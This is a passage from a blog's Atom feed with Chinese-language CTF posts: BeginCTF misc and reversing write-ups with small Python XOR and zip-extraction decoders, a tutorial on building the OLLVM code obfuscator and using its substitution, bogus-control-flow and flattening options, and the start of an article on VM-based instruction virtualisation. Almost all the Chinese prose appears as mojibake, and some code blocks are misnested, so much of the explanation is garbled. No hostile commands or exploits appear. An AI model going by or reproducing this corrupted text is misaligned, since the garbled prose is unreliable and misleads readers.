class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line">input_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">36</span>, <span class="number">1</span>):</span><br><span class="line">    input_str += <span class="built_in">chr</span>(c[i % <span class="number">4</span>] ^ flag[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(input_str)</span><br></pre></td></tr></table></figure><h1 id="BeginCTF-20240131"><a href="#BeginCTF-20240131" class="headerlink" title="BeginCTF 20240131"></a>BeginCTF 20240131</h1><h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2===</span><br></pre></td></tr></table></figure><p>base32</p><h3 id="tupper"><a href="#tupper" class="headerlink" title="tupper"></a>tupper</h3><p>è„šæœ¬æŠŠæ‰€æœ‰æ–‡ä»¶ä¿¡æ¯æå–</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_text_from_zip</span>(<span class="params">zip_path, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_txt:</span><br><span class="line">            <span class="keyword">for</span> file_info <span class="keyword">in</span> zip_ref.infolist():</span><br><span class="line">                <span class="keyword">if</span> file_info.filename.endswith(<span class="string">&#x27;.txt&#x27;</span>):</span><br><span class="line">                    <span class="keyword">with</span> zip_ref.<span class="built_in">open</span>(file_info) <span class="keyword">as</span> file:</span><br><span class="line">                        text = file.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        output_txt.write(text)</span><br><span class="line">                        <span class="comment">#output_txt.write(&#x27;\n\n&#x27;)  # å¯ä»¥æ ¹æ®éœ€è¦å¢åŠ åˆ†éš”ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    desktop_path = os.path.join(os.path.expanduser(<span class="string">&quot;~&quot;</span>), <span class="string">&quot;Desktop&quot;</span>)  <span class="comment"># æ¡Œé¢è·¯å¾„ï¼Œæ ¹æ®å®é™…æƒ…å†µä¿®æ”¹</span></span><br><span class="line">    zip_file_path = os.path.join(desktop_path, <span class="string">&quot;tupper.zip&quot;</span>)  <span class="comment"># å‹ç¼©åŒ…è·¯å¾„ï¼Œæ ¹æ®å®é™…æƒ…å†µä¿®æ”¹</span></span><br><span class="line">    output_file_path = os.path.join(desktop_path, <span class="string">&quot;output.txt&quot;</span>)  <span class="comment"># è¾“å‡ºæ–‡ä»¶è·¯å¾„ï¼Œæ ¹æ®å®é™…æƒ…å†µä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line">    extract_text_from_zip(zip_file_path, output_file_path)</span><br></pre></td></tr></table></figure><p>çœ‹é¢˜ç›®æ˜¯tupperï¼Œè¯´ä¸å®šæ˜¯ä¸ªåŠ å¯†æ–¹å¼ï¼Œä¸€æœï¼Œå“ˆçœŸæ˜¯</p><p><a href="http://t.csdnimg.cn/OF1OP">ä»£ç æ€¥è½¬å¼¯â€”â€”Tupperï¼ˆå¡”ç€è‡ªæŒ‡å…¬å¼ï¼‰</a></p><p><a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><p>ä¸Šé¢output.txtå†…å®¹â€“&gt;bese64â€“&gt;kâ€“&gt;flag</p><h3 id="where-is-crazyman-v1-0"><a href="#where-is-crazyman-v1-0" class="headerlink" title="where is crazyman v1.0"></a>where is crazyman v1.0</h3><p>googleè¯†å›¾</p><h3 id="devilâ€™s-word"><a href="#devilâ€™s-word" class="headerlink" title="devilâ€™s word"></a>devilâ€™s word</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leu lia leu ng leu cai leu jau leu e cai b cai jau sa leng cai ng ng f leu b leu e sa leng cai cai ng f cai cai sa sa leu e cai a leu bo leu f cai ng ng f leu sii leu jau sa sii leu c leu ng leu sa cai sii cai d</span><br></pre></td></tr></table></figure><p>æˆ‘çš„è§£å¯†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">leu lia 62 </span><br><span class="line">leu ng 65</span><br><span class="line">leu cai 67</span><br><span class="line">leu jau 69</span><br><span class="line">leu e 61</span><br><span class="line">cai b 78</span><br><span class="line">cai jau 79</span><br><span class="line">sa leng 32</span><br><span class="line">cai ng 75</span><br><span class="line">ng f 58</span><br><span class="line">leu b 68</span><br><span class="line">leu e 65</span><br><span class="line">sa leng 32</span><br><span class="line">cai cai 77</span><br><span class="line">ng f 58</span><br><span class="line">cai cai 77</span><br><span class="line">sa sa 33</span><br><span class="line">leu e 61</span><br><span class="line">cai a 71</span><br><span class="line">leu bo 68</span><br><span class="line">leu f 68</span><br><span class="line">cai ng 75</span><br><span class="line">ng f 58</span><br><span class="line">leu sii 64</span><br><span class="line">leu jau 69</span><br><span class="line">sa sii 34</span><br><span class="line">leu c 67</span><br><span class="line">leu ng 65</span><br><span class="line">leu sa 63</span><br><span class="line">cai sii 74</span><br><span class="line">cai d 76</span><br></pre></td></tr></table></figure><h2 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h2><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>agh{^bvuwTooahlYocPtmyiijj|ek</p><p>63290794207715587679621386735000</p><p>åè°ƒè¯•</p><h3 id="real-checkin-xor"><a href="#real-checkin-xor" class="headerlink" title="real checkin xor"></a>real checkin xor</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_func(encrypted, key):</span><br><span class="line">    decrypted = []</span><br><span class="line">    for i in range(len(encrypted)):</span><br><span class="line">        decrypted.append(chr(encrypted[i] ^ ord(key[i % len(key)])))</span><br><span class="line">    return &#x27;&#x27;.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = &quot;ez_python_xor_reverse&quot;</span><br><span class="line">ciper = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]</span><br><span class="line"></span><br><span class="line">decrypted_text = decrypt_func(ciper, key)</span><br><span class="line">print(&quot;è§£å¯†åçš„æ–‡æœ¬:&quot;, decrypted_text)</span><br></pre></td></tr></table></figure><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="é€†å‘å·¥ç¨‹-reverse-å…¥é—¨æŒ‡å—"><a href="#é€†å‘å·¥ç¨‹-reverse-å…¥é—¨æŒ‡å—" class="headerlink" title="é€†å‘å·¥ç¨‹(reverse)å…¥é—¨æŒ‡å—"></a>é€†å‘å·¥ç¨‹(reverse)å…¥é—¨æŒ‡å—</h3><p>pdféšå†™</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HGAME-20240129&quot;&gt;&lt;a href=&quot;#HGAME-20240129&quot; class=&quot;headerlink&quot; title=&quot;HGAME 20240129&quot;&gt;&lt;/a&gt;HGAME 20240129&lt;/h1&gt;&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#M</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>OLLVM</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/24/ollvm!/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/24/ollvm!/</id>
    <published>2024-01-23T16:00:00.000Z</published>
    <updated>2024-02-02T12:15:29.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OLLVM"><a href="#OLLVM" class="headerlink" title="OLLVM"></a>OLLVM</h1><p>LLVM æ˜¯ä¸€ä¸ª<strong>å¼€æºçš„ç¼–è¯‘å™¨æ¶æ„</strong>ï¼Œåˆ©ç”¨è™šæ‹ŸæŠ€æœ¯å¯¹æºä»£ç æä¾›ç°ä»£åŒ–çš„ã€ä¸ç›®æ ‡æ— å…³çš„ã€é’ˆå¯¹å¤šç§ CPUçš„ï¼Œä»£ç ä¼˜åŒ–å’Œä»£ç ç”ŸæˆåŠŸèƒ½ã€‚</p><p>LLVM æ ¸å¿ƒåº“æä¾›äº†ä¸ç¼–è¯‘å™¨ç›¸å…³çš„æ”¯æŒï¼Œå¯ä»¥ä½œä¸ºå¤šç§è¯­è¨€ç¼–è¯‘å™¨çš„åå°æ¥ä½¿ç”¨ï¼Œèƒ½å¤Ÿè¿›è¡Œç¨‹åºè¯­è¨€çš„ç¼–è¯‘æœŸä¼˜åŒ–ã€é“¾æ¥ä¼˜åŒ–ã€åœ¨çº¿ç¼–è¯‘ä¼˜åŒ–ã€ä»£ç ç”Ÿæˆã€‚</p><p>LLVM ä¸‰æ®µå¼æ¶æ„ï¼š</p><ul><li><p>å‰ç«¯ï¼šè§£ææºä»£ç ï¼Œç”±è¯­æ³•åˆ†æå™¨å’Œè¯­ä¹‰åˆ†æååŒå·¥ä½œï¼Œæ£€æŸ¥è¯­æ³•é”™è¯¯ï¼Œå¹¶æ„å»ºè¯­è¨€çš„æŠ½è±¡è¯­æ³•æ ‘æ¥è¡¨ç¤ºè¾“å…¥ä»£ç ï¼Œ ç„¶åå°†åˆ†æå¥½çš„ä»£ç è½¬åŒ–ä¸º LLVM çš„ä¸­é—´è¡¨ç¤º IR (IntermediateRepresentation) ã€‚</p></li><li><p>ä¼˜åŒ–å™¨ï¼šé€šè¿‡ä¸€ç³»åˆ—çš„ Pass å¯¹ä¸­é—´ä»£ç  IR è¿›è¡Œä¼˜åŒ–ï¼Œ æ”¹å–„ä»£ç çš„è¿è¡Œæ—¶é—´ä½¿ä»£ç æ›´é«˜æ•ˆã€‚</p></li><li><p>åç«¯ï¼šè´Ÿè´£å°†ä¼˜åŒ–å™¨ä¼˜åŒ–åçš„ä¸­é—´ä»£ç  IR è½¬æ¢ä¸ºç›®æ ‡æœºå™¨çš„ä»£ç </p></li></ul><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130149036.png" alt="image-20240124130149036"></p><p><strong>OLLVM(Obfuscator-LLVM)</strong> æ˜¯ç‘å£«è¥¿éƒ¨åº”ç”¨ç§‘å­¦å¤§å­¦å®‰å…¨å°ç»„äº 2010 å¹´ 6 æœˆå‘èµ·çš„ä¸€ä¸ªé¡¹ç›®ã€‚è¯¥é¡¹ç›®çš„ç›®çš„æ˜¯æä¾›ä¸€å¥—å¼€æºçš„<strong>åŸºäº****LLVM</strong>çš„ä»£ç æ··æ·†å·¥å…·ï¼Œé€šè¿‡ä»£ç æ··æ·†å’Œé˜²ç¯¡æ”¹æä¾›æ›´é«˜çš„è½¯ä»¶å®‰å…¨</p><p>æ€§ã€‚</p><p>OLLVM å·¥ä½œåœ¨ LLVM IR ä¸­é—´è¡¨ç¤ºå±‚ï¼Œé€šè¿‡<strong>ç¼–å†™<strong><strong>Pass</strong></strong>æ¥æ··æ·†****IR</strong>ï¼Œ åç«¯ä¾ç…§ IR è½¬æ¢çš„ç›®æ ‡æœºå™¨çš„ä»£ç ä¹Ÿå°±è¾¾åˆ°äº†æ··æ·†çš„ç›®çš„ã€‚</p><p>OLLVM æä¾›äº†ä¸‰ç§æ··æ·†æ¨¡å¼ï¼š</p><ul><li><p>æŒ‡ä»¤æ›¿æ¢ (Instructions Substitution)</p></li><li><p>è™šå‡æ§åˆ¶æµ (BogusControl Flow)</p></li><li><p>æ§åˆ¶æµå¹³å¦åŒ– (Control Flow Flattening)</p></li></ul><h2 id="æ­£å‘ä½¿ç”¨"><a href="#æ­£å‘ä½¿ç”¨" class="headerlink" title="æ­£å‘ä½¿ç”¨"></a><strong>æ­£å‘ä½¿ç”¨</strong></h2><h4 id="ç¼–è¯‘-ollvm"><a href="#ç¼–è¯‘-ollvm" class="headerlink" title="ç¼–è¯‘ ollvm"></a><strong>ç¼–è¯‘</strong> <strong>ollvm</strong></h4><p>ç¼–è¯‘ç¯å¢ƒä¸º ubuntu 20.04ï¼Œå…ˆä¸‹è½½ ollvm æºç ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b llvm-<span class="number">4</span>.<span class="number">0</span> https://github.com/obfuscator-llvm/obfuscator.git</span><br></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹ <code>obfuscator/include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h</code> æ–‡ä»¶ç¬¬690 è¡Œï¼Œå°† <code>Expected&lt;std::vector&lt;uint8_t&gt;&gt;</code> æ”¹ä¸º<code>Expected&lt;std::vector&lt;unsigned char&gt;&gt;</code></p><p>æ¥ç€é™ä½ gcc ç‰ˆæœ¬ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-<span class="number">8</span> g++-<span class="number">8</span> -y</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-<span class="number">8</span> <span class="number">8</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-<span class="number">8</span> <span class="number">8</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-<span class="number">9</span> <span class="number">9</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-<span class="number">9</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><p>åˆ‡æ¢ gcc ä¸ g++ çš„é»˜è®¤ç‰ˆæœ¬</p><p>sudo update-alternatives â€“config gcc</p><p>sudo update-alternatives â€“config g++</p><p>åœ¨ obfuscator ç›®å½•ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¼€å§‹ç¼–è¯‘ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../</span><br><span class="line">make -j7</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆåï¼Œåœ¨ obfuscator&#x2F;build&#x2F;bin ç›®å½•ä¸‹ä¼šäº§ç”Ÿå¾ˆå¤šå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†è¿™ä¸ªè·¯å¾„æ·»åŠ åˆ°ç¯å¢ƒå˜é‡å³å¯ã€‚</p><h3 id="ä½¿ç”¨-ollvm"><a href="#ä½¿ç”¨-ollvm" class="headerlink" title="ä½¿ç”¨ ollvm"></a><strong>ä½¿ç”¨</strong> <strong>ollvm</strong></h3><h4 id="æŒ‡ä»¤æ›¿æ¢"><a href="#æŒ‡ä»¤æ›¿æ¢" class="headerlink" title="æŒ‡ä»¤æ›¿æ¢"></a><strong>æŒ‡ä»¤æ›¿æ¢</strong></h4><p>é€šè¿‡åŠŸèƒ½ä¸Šç­‰ä»·çš„ä½†æ›´å¤æ‚çš„æŒ‡ä»¤åºåˆ—ï¼Œ æ›¿æ¢æ ‡å‡†äºŒå…ƒè¿ç®—ç¬¦ï¼ˆå¦‚åŠ æ³•ã€ å‡æ³•æˆ–å¸ƒå°”è¿ç®—ç¬¦ï¼‰ï¼Œ å½“æœ‰</p><p>å¤šä¸ªå¯ç”¨çš„ç­‰æ•ˆæŒ‡ä»¤åºåˆ—æ—¶ï¼Œ éšæœºé€‰æ‹©ä¸€ä¸ªã€‚</p><p>ç¼–è¯‘é€‰é¡¹ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-mllvm -sub: æ¿€æ´»æŒ‡ä»¤æ›¿ä»£</span><br><span class="line">-mllvm -sub_loop=<span class="number">3</span>: æ··æ·†æ¬¡æ•°ï¼Œä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·†<span class="number">3</span>æ¬¡ï¼Œé»˜è®¤ä¸º<span class="number">1</span>æ¬¡</span><br></pre></td></tr></table></figure><p>æ··æ·†å‰åå¯¹æ¯”</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130430375.png" alt="image-20240124130430375"></p><h5 id="æŒ‡ä»¤è½¬æ¢ï¼š"><a href="#æŒ‡ä»¤è½¬æ¢ï¼š" class="headerlink" title="æŒ‡ä»¤è½¬æ¢ï¼š"></a>æŒ‡ä»¤è½¬æ¢ï¼š</h5><p>Addition</p><ul><li><p><code>a = b - (-c)</code></p></li><li><pre><code>r = rand (); a = b - r; a = a + b; a = a + r<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  r = rand (); a = b + r; a = a + c; a = a - r</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>a = -(-b + (-c))<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Subtraction</span><br><span class="line"></span><br><span class="line">- `a = b + (-c)`</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  r = rand (); a = b - r; a = a - c; a = a + r</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>r = rand (); a = b + r; a = a - c; a = a - r</code></pre></li></ul><p>AND</p><ul><li><code>a = b &amp; c</code> &#x3D;&gt; <code>a = (b ^ ~c) &amp; b</code></li></ul><p>OR</p><ul><li><code>a = b | c</code> &#x3D;&gt; <code>a = (b &amp; c) | (b ^ c)</code></li></ul><p>XOR</p><ul><li><code>a = a ^ b</code> &#x3D;&gt; <code>a = (~a &amp; b) | (a &amp; ~b)</code></li></ul><h4 id="è™šå‡æ§åˆ¶æµ"><a href="#è™šå‡æ§åˆ¶æµ" class="headerlink" title="è™šå‡æ§åˆ¶æµ"></a><strong>è™šå‡æ§åˆ¶æµ</strong></h4><p>é€šè¿‡åœ¨å½“å‰åŸºæœ¬å—ä¹‹å‰æ·»åŠ åŸºæœ¬å—æ¥ä¿®æ”¹ç¨‹åºçš„æ§åˆ¶æµå›¾ï¼ŒåŸå§‹çš„åŸºæœ¬å—ä¹Ÿä¼šè¢«å…‹éš†ï¼Œå¹¶æ’å…¥éšæœºçš„åƒåœ¾æŒ‡ä»¤ã€‚</p><p>ç¼–è¯‘é€‰é¡¹ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-mllvm -bcf: æ¿€æ´»è™šå‡æ§åˆ¶æµ</span><br><span class="line">-mllvm -bcf_loop=<span class="number">3</span>: æ··æ·†æ¬¡æ•°ï¼Œä¸€ä¸ªå‡½æ•°ä¼šè¢«æ··æ·†<span class="number">3</span>æ¬¡ï¼Œé»˜è®¤ä¸º<span class="number">1</span></span><br><span class="line">-mllvm -bcf_prob=<span class="number">40</span>: æ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ï¼Œå½“å‰æ¯ä¸ªåŸºæœ¬å—è¢«æ··æ·†çš„æ¦‚ç‡ä¸º<span class="number">40</span><span class="variable">%ï¼Œé»˜è®¤ä¸º30%</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130457258.png" alt="image-20240124130457258"></p><h4 id="æ§åˆ¶æµå¹³å¦åŒ–"><a href="#æ§åˆ¶æµå¹³å¦åŒ–" class="headerlink" title="æ§åˆ¶æµå¹³å¦åŒ–"></a><strong>æ§åˆ¶æµå¹³å¦åŒ–</strong></h4><p>æ¶ˆé™¤æ­£å¸¸ç¨‹åºæ§åˆ¶æµä¸­åŸºæœ¬å—çš„ç›¸äº’å…³è”ï¼Œä½¿ç”¨ä¸€ä¸ªé›†ä¸­çš„ä¸»åˆ†å‘å—æ¥è°ƒåº¦åŸºæœ¬å—çš„æ‰§è¡Œé¡ºåºï¼Œå¾—åˆ°ä¸€</p><p>ä¸ªå¾ªç¯åµŒå¥—Switchçš„æ‰§è¡Œé€»è¾‘ã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130521676.png" alt="image-20240124130521676"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240124130535132.png" alt="image-20240124130535132"></p><p>åºè¨€ï¼šå‡½æ•°çš„ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„åŸºæœ¬å—ä¸»(å­)åˆ†å‘å™¨ï¼šæ§åˆ¶ç¨‹åºè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå¾…æ‰§è¡Œçš„åŸºæœ¬å—</p><p>retnå—ï¼šå‡½æ•°å‡ºå£</p><p>çœŸå®å—ï¼šæ··æ·†å‰çš„åŸºæœ¬å—ï¼Œç¨‹åºçœŸæ­£æ‰§è¡Œå·¥ä½œçš„ç‰ˆå—</p><p>é¢„å¤„ç†å™¨ï¼šè·³è½¬åˆ°ä¸»åˆ†å‘å™¨</p><p>ç¼–è¯‘é€‰é¡¹ï¼š</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening">https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-mllvm -fla: æ¿€æ´»æ§åˆ¶æµå¹³å¦åŒ–</span><br><span class="line">-mllvm -split: æ¿€æ´»åŸºæœ¬å—åˆ†å‰²</span><br><span class="line">-mllvm -split_num=<span class="number">3</span>: æŒ‡å®šåŸºæœ¬å—åˆ†å‰²çš„æ•°ç›®</span><br></pre></td></tr></table></figure><p><a href="http://t.csdnimg.cn/FaGnP">angrå®‰è£…</a></p><p>å…³äºangrçš„ä¸€äº›é¢˜ç›®ï¼š<a href="https://www.cnblogs.com/level5uiharu/p/16925991.html">https://www.cnblogs.com/level5uiharu/p/16925991.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OLLVM&quot;&gt;&lt;a href=&quot;#OLLVM&quot; class=&quot;headerlink&quot; title=&quot;OLLVM&quot;&gt;&lt;/a&gt;OLLVM&lt;/h1&gt;&lt;p&gt;LLVM æ˜¯ä¸€ä¸ª&lt;strong&gt;å¼€æºçš„ç¼–è¯‘å™¨æ¶æ„&lt;/strong&gt;ï¼Œåˆ©ç”¨è™šæ‹ŸæŠ€æœ¯å¯¹æºä»£ç æä¾›ç°ä»£åŒ–çš„ã€ä¸ç›®æ ‡æ— å…³çš„ã€</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>æŒ‡ä»¤è™šæ‹ŸåŒ–</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/23/%E6%8C%87%E4%BB%A4%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/23/%E6%8C%87%E4%BB%A4%E8%99%9A%E6%8B%9F%E5%8C%96/</id>
    <published>2024-01-22T16:00:00.000Z</published>
    <updated>2024-02-02T12:18:45.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æŒ‡ä»¤è™šæ‹ŸåŒ–"><a href="#æŒ‡ä»¤è™šæ‹ŸåŒ–" class="headerlink" title="æŒ‡ä»¤è™šæ‹ŸåŒ–"></a>æŒ‡ä»¤è™šæ‹ŸåŒ–</h1><p>è™šæ‹Ÿæœºï¼ˆVMï¼‰å…¶å®å°±æ˜¯ç”¨è½¯ä»¶æ¥æ¨¡æ‹Ÿç¡¬ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ä»¿ç…§ x86 æŒ‡ä»¤é›†ï¼Œè‡ªå·±å®šä¹‰ä¸€å¥—æŒ‡ä»¤ï¼Œåœ¨ç¨‹åºï¼ˆè§£é‡Šå™¨ï¼‰ä¸­æœ‰ä¸€å¥—å‡½æ•°å’Œç»“æ„æ¥è§£æè‡ªå®šä¹‰çš„æŒ‡ä»¤å¹¶æ‰§è¡Œç›¸åº”çš„åŠŸèƒ½ã€‚</p><p>è™šæ‹ŸåŒ–æ˜¯ä¸€ç§åŸºäºè™šæ‹Ÿæœºçš„ä»£ç ä¿æŠ¤æŠ€æœ¯ã€‚ä»–å°†ç¡¬ä»¶æ”¯æŒçš„æœºå™¨ç è½¬åŒ–ä¸ºå­—èŠ‚ç æŒ‡ä»¤ç³»ç»Ÿï¼Œæ¥è¾¾åˆ°ä¸è¢«è½»æ˜“ç¯¡æ”¹å’Œé€†å‘çš„ç›®çš„ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯å‡ºé¢˜äººé€šè¿‡å®ç°ä¸€ä¸ªå°å‹çš„è™šæ‹Ÿæœºï¼Œè‡ªå®šä¹‰ä¸€äº›æ“ä½œç ï¼ˆopcodeï¼‰ï¼Œç„¶ååœ¨ç¨‹åºæ‰§è¡Œæ—¶é€šè¿‡è§£é‡Šæ“ä½œç ï¼Œæ‰§è¡Œå¯¹åº”çš„å‡½æ•°ï¼Œä»è€Œå®ç°ç¨‹åºåŸæœ‰çš„åŠŸèƒ½ã€‚</p><p>ä¸‹å›¾æ˜¯å¸¸è§çš„è™šæ‹Ÿæœºç»“æ„ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240123191130428.png" alt="image-20240123191130428"></p><p>è™šæ‹Ÿæœºçš„ä¸»ç¨‹åºå…¶å®å°±æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œè¿™ä¸ªå¾ªç¯ä¸æ–­çš„å»è¯»å–æŒ‡ä»¤ï¼ˆä¼ªæœºå™¨ç  opcodeï¼‰ï¼Œç„¶åæ‰§è¡ŒæŒ‡ä»¤opcode æ‰€å¯¹åº”çš„ä¸€äº›å‡½æ•°ï¼Œè¿™æ ·ä¸‹æ¥å°±å¯ä»¥ä¸çœŸå®çš„ç¨‹åºæ‰§è¡Œç›¸å·®æ— å‡ ã€‚</p><h2 id="æ­£å‘å®ç°"><a href="#æ­£å‘å®ç°" class="headerlink" 